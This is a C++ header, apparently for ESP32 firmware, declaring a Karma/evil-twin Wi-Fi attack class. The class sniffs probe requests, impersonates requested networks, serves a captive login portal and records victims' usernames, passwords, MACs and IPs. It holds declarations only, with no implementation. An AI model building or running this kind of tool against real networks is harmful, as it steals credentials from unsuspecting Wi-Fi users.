#pragma once
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>

#define MAX_KARMA_SSIDS  20
#define MAX_KARMA_CREDS  20

struct KarmaCred {
  String user, pass, mac, ip, ssid;
};

struct KarmaTarget {
  char ssid[33];
  bool selected;
};

struct KarmaConn {
  String ip, mac, useragent, ssid;
  uint32_t ts;
};

class KarmaAttack {
public:
  void begin();
  int  scan();                          // scan nearby APs to build target list
  void select(int idx, bool on);
  void selectAll();
  void clearSelection();
  bool start();
  void stop();
  void tick();

  bool      isRunning()       { return _running; }
  String    getPortalHtml(const String& ssidOverride = "");
  bool      isScanning()      { return _scanning; }
  int       getScanCount()    { return _scanCount; }
  KarmaTarget& getTarget(int i){ return _targets[i]; }
  int       getCredCount()    { return _credCount; }
  KarmaCred getCred(int i)    { return (i>=0&&i<_credCount)?_creds[i]:KarmaCred{}; }
  int       getConnCount()    { return _connCount; }
  KarmaConn getConn(int i)    { return (i>=0&&i<_connCount)?_conns[i]:KarmaConn{}; }
  String    getLastSSID()     { return _lastSSID; }
  String    getLastProbe()    { return _lastProbe; }

private:
  bool         _running   = false;
  bool         _scanning  = false;
  int          _scanCount = 0;
  int          _credCount = 0;
  int          _connCount = 0;
  static const int MAX_KARMA_CONNS = 20;
  KarmaConn    _conns[20];
  String       _lastSSID  = "";
  String       _lastProbe = "";
  String       _currentAP = "";
  uint32_t     _lastCheck = 0;

  KarmaTarget  _targets[MAX_KARMA_SSIDS];
  KarmaCred    _creds[MAX_KARMA_CREDS];

  WebServer*   _portalServer = nullptr;
  DNSServer*   _dns          = nullptr;

  bool  _targetSelected(const char* ssid);
  void  startPortal(const char* ssid);
  void  stopPortal();
  void  serveCaptive();
  void  redirectToPortal();
  void  handleRoot();
  void  handleLogin();
  void  handleSuccess();
  void  handleNotFound();
  void  handleProbe(const uint8_t* payload, int len);

  static void snifferCb(void* buf, wifi_promiscuous_pkt_type_t type);
  static KarmaAttack* _instance;
};
